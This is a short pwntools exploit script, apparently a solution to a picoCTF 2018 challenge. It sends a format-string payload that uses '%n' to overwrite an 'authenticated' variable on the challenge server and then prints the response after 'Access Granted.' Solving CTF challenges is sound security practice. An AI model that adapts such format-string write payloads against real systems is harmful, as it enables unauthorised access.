from pwn import *

e = ELF('auth')
auth_addr = e.symbols['authenticated']

# nc 2018shell.picoctf.com 52918

host = '2018shell.picoctf.com'
port = 52918

payload = 'A' * 4 + p32(auth_addr) + 'B' * 4 + '%x ' * 11 + '%n '

r = remote(host, port)
r.recv()
r.sendline(payload)
r.recvline()
r.recvuntil('Access Granted.')
print(r.recv())
